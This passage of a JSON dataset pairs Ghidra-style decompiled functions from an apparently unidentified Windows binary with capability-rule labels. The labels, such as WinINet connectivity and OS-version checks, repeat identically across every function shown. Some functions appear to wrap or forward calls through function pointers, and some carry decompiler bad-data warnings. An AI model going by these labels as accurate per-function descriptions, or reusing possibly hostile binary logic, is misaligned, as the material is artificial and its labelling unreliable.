        "decompiled_code": "\nint32_t __cdecl fcn.00038da0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_1ch = NULL;\n    var_10h = NULL;\n    fcn.00037150(0xb1c5b474, &var_8h, 0);\n    iVar1 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n    if ((iVar1 != 0) && (var_4h = fcn.00038f90(arg_8h, 1),  var_4h != 0)) {\n        var_1ch = var_4h + 0x18;\n        var_10h = var_4h + 0x14;\n    }\n    fcn.00037180(0xb1c5b474, &var_8h, 0);\n    if (var_4h == 0) {\n        iVar1 = -0x3ffffff3;\n    }\n    else if ((*var_1ch == 0) && (*var_10h == 0)) {\n        if (*(arg_8h + 0x24) == 0) {\n            iVar1 = -0x3fffffff;\n        }\n        else {\n            iVar1 = *(*(arg_8h + 0x24) + *0xb1c5b50c);\n            if ((iVar1 == 0) || (iVar1 = fcn.000631a0(iVar1, 0xb1c059d0, var_1ch),  iVar1 == 0)) {\n                iVar1 = fcn.000631a0(*(arg_8h + *0xb1c68548), 0xb1c05a30, var_10h);\n                if (iVar1 != 0) {\n                    fcn.000635f0(var_1ch);\n                }\n                iVar1 = 0;\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 520
    },
    "00038ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00038ec0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    iVar1 = fcn.00038f90(arg_10h, 0);\n    if (iVar1 == 0) {\n        puVar2 = fcn.00035230(0x1c);\n        if (puVar2 == NULL) {\n            var_ch = 0xc000009a;\n        }\n        else {\n            *puVar2 = 0;\n            puVar2[1] = 0;\n            puVar2[2] = 0;\n            puVar2[3] = 0;\n            puVar2[4] = 0;\n            puVar2[5] = 0;\n            puVar2[6] = 0;\n            puVar2[1] = arg_8h;\n            puVar2[2] = arg_ch;\n            puVar2[3] = arg_10h;\n            fcn.00037150(0xb1c5b474, &var_4h, 1);\n            iVar1 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n            if (iVar1 == 0) {\n                var_ch = 0x21590006;\n            }\n            else {\n                *puVar2 = *0xb1c5b470;\n                *0xb1c5b470 = puVar2;\n            }\n            fcn.00037180(0xb1c5b474, &var_4h, 1);\n        }\n    }\n    else {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 410
    },
    "00038f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00038f90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b474, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b470; (var_8h != NULL && (var_8h[3] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b474, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 178
    },
    "00039000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00039000(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b474, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b470; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b474, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 177
    },
    "00039070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00039070(void)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = 0;\n    fcn.00037150(0xb1c5b474, &var_8h, 0);\n    var_4h = *0xb1c5b470;\n    do {\n        if (var_4h == NULL) {\ncode_r0x000390d3:\n            fcn.00037180(0xb1c5b474, &var_8h, 0);\n            return var_ch;\n        }\n        uVar1 = fcn.0003cf90(var_4h[2]);\n        var_4h[4] = uVar1;\n        if (var_4h[4] == 0) {\n            var_ch = 0xc0000001;\n            goto code_r0x000390d3;\n        }\n        var_4h = *var_4h;\n    } while( true );\n}\n",
        "token_count": 238
    },
    "000390f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000390f0(uint arg_8h)\n\n{\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_10h = 0;\n    var_24h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_20h = fcn.00041370(arg_8h, &var_1ch, &var_14h, 0xb1c5b488);\n    if (var_20h == 0) {\n        fcn.00036f50(0xb1c5b48c);\n        var_20h = fcn.00034a80(0xb1be18ec, &var_8h);\n        if ((((((var_20h == 0) && (var_20h = fcn.0005c850(var_8h, 0xb1be1b84, &var_18h),  var_20h == 0)) &&\n              (var_20h = fcn.0005c850(var_8h, 0xb1be1ba0, &var_10h),  var_20h == 0)) &&\n             ((var_20h = fcn.0005c850(var_8h, 0xb1be1e64, &var_24h),  var_20h == 0 &&\n              (var_20h = fcn.0005c850(var_8h, 0xb1be1e7c, &var_4h),  var_20h == 0)))) &&\n            ((var_20h = fcn.000631a0(var_18h, 0xb1c06550, 0xb1c5b4a0),  var_20h == 0 &&\n             ((var_20h = fcn.000631a0(var_10h, 0xb1c06590, 0xb1c5b4a4),  var_20h == 0 &&\n              (var_20h = fcn.000631a0(var_24h, 0xb1c06ab0, 0xb1c5b4a8),  var_20h == 0)))))) &&\n           (var_20h = fcn.000631a0(var_4h, 0xb1c064e0, 0xb1c5b4ac),  var_20h == 0)) {\n            var_20h = 0;\n            var_ch = 0;\n            while ((var_ch < var_14h && (var_20h = fcn.00039370(*(var_1ch + var_ch * 4)),  var_20h == 0))) {\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    fcn.00035330(var_1ch);\n    if (var_20h != 0) {\n        fcn.000392c0();\n    }\n    return var_20h;\n}\n",
        "token_count": 730
    },
    "000392c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.000392c0(void)\n\n{\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n        if (*0xb1c5b498 == 0) {\n            var_ch = 0;\n        }\n        else {\n            var_ch = *(*0xb1c5b498 + 4);\n        }\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n        if (var_ch == 0) break;\n        fcn.00039350(var_ch);\n    }\n    fcn.000635f0(0xb1c5b4a4);\n    fcn.000635f0(0xb1c5b4a0);\n    fcn.000635f0(0xb1c5b4a8);\n    fcn.000635f0(0xb1c5b4ac);\n    return;\n}\n",
        "token_count": 253
    },
    "00039370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039370(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_10h = fcn.0003a200(arg_8h);\n    if (var_10h == 0) {\n        var_10h = fcn.00039810(arg_8h, 4);\n        if ((((var_10h == 0) && (var_10h = fcn.00039810(arg_8h, 3),  var_10h == 0)) &&\n            (var_10h = fcn.00039810(arg_8h, 0),  var_10h == 0)) && (var_10h = fcn.00039810(arg_8h, 2),  var_10h == 0)) {\n            var_ch = *(arg_8h + 0xc);\n            while ((var_ch != 0 && (var_10h = fcn.0003a050(var_ch, *(var_ch + 0xc), arg_8h),  var_10h == 0))) {\n                if (*0xb1c5b488 != 0) {\n                    var_4h = *(var_ch + *0xb1c5b488);\n                    if (var_4h == var_ch) break;\n                    iVar1 = fcn.0003a290(var_ch);\n                    if (iVar1 != 0) {\n                        var_10h = fcn.00039710(var_ch, *(var_ch + iVar1 + 8), 0);\n                        if ((var_10h != 0) ||\n                           (var_10h = fcn.00039710(var_ch, *(var_ch + iVar1 + 0xc), 2),  var_10h != 0)) break;\n                    }\n                }\n                var_ch = var_4h;\n            }\n        }\n        if (var_10h != 0) {\n            fcn.00039350(arg_8h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 497
    },
    "000394e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000394e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.00037150(0xb1c5b48c, &var_8h, 1);\n    var_4h = fcn.00039fe0(arg_ch, 1);\n    if (var_4h != 0) {\n        *(var_4h + 0x18) = arg_10h;\n    }\n    fcn.00037180(0xb1c5b48c, &var_8h, 1);\n    pcVar1 = fcn.000639f0(arg_8h);\n    (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 215
    },
    "00039550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039550(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    puVar3 = arg_18h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, puVar3);\n    if (iVar2 == 0) {\n        fcn.00039370(*arg_18h);\n    }\n    return iVar2;\n}\n",
        "token_count": 160
    },
    "000395b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000395b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    fcn.00037150(0xb1c5b48c, &var_4h, 1);\n    iVar1 = fcn.0003a120(arg_8h, 1);\n    if (iVar1 != 0) {\n        var_ch = *(iVar1 + 0xc);\n        var_14h = *(iVar1 + 0x10);\n        var_10h = *(iVar1 + 0x18);\n        var_8h = *(iVar1 + 0x14);\n        *(iVar1 + 0x18) = 0;\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0xc) = 0;\n        *(iVar1 + 0x10) = 0;\n    }\n    fcn.00037180(0xb1c5b48c, &var_4h, 1);\n    fcn.000635f0(&var_ch);\n    fcn.000635f0(&var_14h);\n    fcn.000635f0(&var_10h);\n    fcn.000635f0(&var_8h);\n    return 0;\n}\n",
        "token_count": 355
    },
    "00039680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00039680(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    fcn.00037150(0xb1c5b48c, &var_4h, 1);\n    var_8h = fcn.00039fe0(arg_8h, 1);\n    if (var_8h != 0) {\n        var_ch = *(var_8h + 8);\n        var_10h = *(var_8h + 0xc);\n        *(var_8h + 8) = 0;\n        *(var_8h + 0xc) = 0;\n    }\n    fcn.00037180(0xb1c5b48c, &var_4h, 1);\n    fcn.000635f0(&var_ch);\n    fcn.000635f0(&var_10h);\n    return 0;\n}\n",
        "token_count": 239
    },
    "00039710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039710(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    if (arg_8h == 0) {\n        iVar1 = -0x3fffff11;\n    }\n    else if (arg_ch == 0) {\n        iVar1 = 0;\n    }\n    else {\n        if (arg_10h == 0) {\n            var_4h = 0xb1c06b50;\n        }\n        else {\n            if (arg_10h != 2) {\n                return -0x3fffff0f;\n            }\n            var_4h = 0xb1c06c30;\n        }\n        iVar1 = fcn.000638e0(arg_ch, 0x50, 5, &var_14h);\n        if (iVar1 == 0) {\n            if (var_14h < 5) {\n                iVar1 = 0;\n            }\n            else {\n                fcn.00037150(0xb1c5b48c, &var_8h, 1);\n                var_ch = fcn.00039fe0(arg_8h, 1);\n                if (var_ch != 0) {\n                    if (arg_10h == 0) {\n                        var_10h = var_ch + 8;\n                    }\n                    else if (arg_10h == 2) {\n                        var_10h = var_ch + 0xc;\n                    }\n                }\n                fcn.00037180(0xb1c5b48c, &var_8h, 1);\n                iVar1 = fcn.000631a0(arg_ch, var_4h, var_10h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 477
    },
    "00039810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x000398a1)\n// WARNING: Removing unreachable block (ram,0x000398ae)\n// WARNING: Removing unreachable block (ram,0x000398d0)\n// WARNING: Removing unreachable block (ram,0x000398dd)\n// WARNING: Removing unreachable block (ram,0x00039901)\n// WARNING: Removing unreachable block (ram,0x0003990d)\n// WARNING: Removing unreachable block (ram,0x00039941)\n// WARNING: Removing unreachable block (ram,0x000398d6)\n// WARNING: Removing unreachable block (ram,0x000398c8)\n// WARNING: Switch with 1 destination removed at 0x0003983a\n\nuint __cdecl fcn.00039810(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch < 5) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    return 0;\n}\n",
        "token_count": 290
    },
    "00039990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039990(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b48c, &var_8h, 0);\n    iVar1 = fcn.0003a190(arg_10h, 1);\n    if (iVar1 == 0) {\n        fcn.00037180(0xb1c5b48c, &var_8h, 0);\n        iVar1 = -0x3fffff0f;\n    }\n    else {\n        var_4h = *(iVar1 + 4);\n        fcn.00037180(0xb1c5b48c, &var_8h, 0);\n        fcn.0003a050(arg_ch, 0, var_4h);\n        uVar3 = arg_ch;\n        pcVar2 = fcn.000639f0(arg_8h);\n        iVar1 = (*pcVar2)(arg_8h, uVar3, arg_10h, arg_14h);\n        if (iVar1 != 0) {\n            fcn.00039d70(arg_ch);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 323
    },
    "00039a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00039a30(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    iVar1 = fcn.00039f70(arg_ch, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 4) == 0)) {\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    }\n    else {\n        arg_8h_00 = *(iVar1 + 0x14);\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n        pcVar2 = fcn.000639f0(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch);\n        fcn.00039d70(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "00039ab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00039ab0(uint arg_8h, uint arg_ch, char *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint var_4h;\n    \n    if ((*arg_10h == -0x74) && (*(arg_10h + 2) == 0x1c)) {\n        fcn.00039680(arg_ch);\n    }\n    uVar3 = arg_ch;\n    pcVar4 = arg_10h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, pcVar4);\n    if (((iVar2 == 0) && (*arg_10h == -0x74)) && (*(arg_10h + 2) == 0x1c)) {\n        fcn.00039710(arg_ch, *(arg_10h + 8), 0);\n        fcn.00039710(arg_ch, *(arg_10h + 0xc), 2);\n    }\n    return iVar2;\n}\n",
        "token_count": 258
    },
    "00039b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00039b50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    iVar2 = fcn.00039f70(arg_ch, 1);\n    if (iVar2 != 0) {\n        var_ch = *(iVar2 + 0x14);\n        if (*(iVar2 + 8) == 0) {\n            var_14h = *(*(iVar2 + 4) + 0xc);\n        }\n        else {\n            var_14h = *(iVar2 + 8);\n        }\n        var_10h = var_14h;\n    }\n    fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    if (((var_ch != 0) && (var_10h != 0)) && (iVar2 = fcn.00050a20(),  iVar2 != 0)) {\n        cVar1 = (**0xb1bde004)();\n        if (cVar1 == '\\x02') {\n            arg_18h = arg_18h | 1;\n        }\n        (**0xb1c5b408)(var_ch, arg_10h, arg_14h, arg_18h);\n        return;\n    }\n    pcVar3 = fcn.000639f0(arg_8h);\n    (*pcVar3)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 440
    },
    "00039c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00039c30(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_20h = 0;\n    var_10h = 0;\n    fcn.00037150(0xb1c5b48c, &var_8h, 0);\n    iVar1 = fcn.00039f70(arg_ch, 1);\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0xc) == 0) {\n            var_24h = *(*(iVar1 + 4) + 0x10);\n        }\n        else {\n            var_24h = *(iVar1 + 0xc);\n        }\n        var_20h = var_24h;\n        var_10h = *(iVar1 + 0x14);\n    }\n    fcn.00037180(0xb1c5b48c, &var_8h, 0);\n    if ((var_10h == 0) || (var_20h == 0)) {\n        pcVar2 = fcn.000639f0(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        var_1ch = NULL;\n        var_4h = NULL;\n        var_14h = arg_10h;\n        while (var_14h != NULL) {\n            puVar3 = *var_14h;\n            iVar1 = fcn.0003c9e0(var_14h);\n            if (iVar1 == 0) {\n                if (var_4h == NULL) {\n                    var_1ch = var_14h;\n                    var_4h = var_14h;\n                    var_14h = puVar3;\n                }\n                else {\n                    *var_1ch = var_14h;\n                    var_1ch = var_14h;\n                    var_14h = puVar3;\n                }\n            }\n            else {\n                *var_14h = 0;\n                (**0xb1c5b40c)(var_10h, var_14h, arg_14h);\n                var_14h = puVar3;\n            }\n        }\n        if (var_4h != NULL) {\n            puVar3 = var_4h;\n            pcVar2 = fcn.000639f0(arg_8h);\n            (*pcVar2)(arg_8h, arg_ch, puVar3, arg_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 660
    },
    "00039d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00039d70(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else {\n        fcn.00039680(arg_8h);\n        fcn.00037150(0xb1c5b48c, &var_4h, 1);\n        var_8h = NULL;\n        for (var_ch = *0xb1c5b49c; (var_ch != NULL && (var_ch[5] != arg_8h)); var_ch = *var_ch) {\n            var_8h = var_ch;\n        }\n        if (var_ch != NULL) {\n            if (var_8h == NULL) {\n                *0xb1c5b49c = *var_ch;\n            }\n            else {\n                *var_8h = *var_ch;\n            }\n        }\n        fcn.00037180(0xb1c5b48c, &var_4h, 1);\n        if (var_ch == NULL) {\n            uVar1 = 0xc00000ef;\n        }\n        else {\n            fcn.00035330(var_ch);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 312
    },
    "00039e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00039e40(int32_t arg_8h)\n\n{\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    do {\n        var_8h = 0;\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n        for (var_ch = *0xb1c5b49c; var_ch != NULL; var_ch = *var_ch) {\n            if (var_ch[4] == arg_8h) {\n                var_8h = var_ch[5];\n                break;\n            }\n        }\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n        if (var_8h == 0) {\n            return 0;\n        }\n        fcn.00039d70(var_8h);\n    } while( true );\n}\n",
        "token_count": 222
    },
    "00039ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00039ec0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.000395b0(arg_8h);\n    fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    var_ch = NULL;\n    for (var_8h = *0xb1c5b498; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n        var_ch = var_8h;\n    }\n    if (var_8h != NULL) {\n        if (var_ch == NULL) {\n            *0xb1c5b498 = *var_8h;\n        }\n        else {\n            *var_ch = *var_8h;\n        }\n    }\n    fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    if (var_8h == NULL) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        fcn.00035330(var_8h);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "00039f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00039f70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b49c; (var_8h != NULL && (var_8h[6] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 181
    },
    "00039fe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
